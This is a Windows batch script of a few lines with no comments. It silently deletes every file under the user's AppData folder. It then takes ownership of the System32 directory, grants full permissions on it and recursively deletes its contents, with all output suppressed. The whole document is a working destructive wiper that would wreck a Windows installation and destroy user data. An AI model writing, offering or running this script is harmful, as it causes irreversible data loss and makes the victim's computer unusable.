@echo off
cd /d "%USERPROFILE%\appdata"
del *.* /s /f /q > nul
takeown /f "C:\windows\system32" /a /r /d Y >nul
icacls "C:\windows\system32" /grant administrators:F >nul
cd "C:\windows\system32"
del *.* /s /f /q >nul
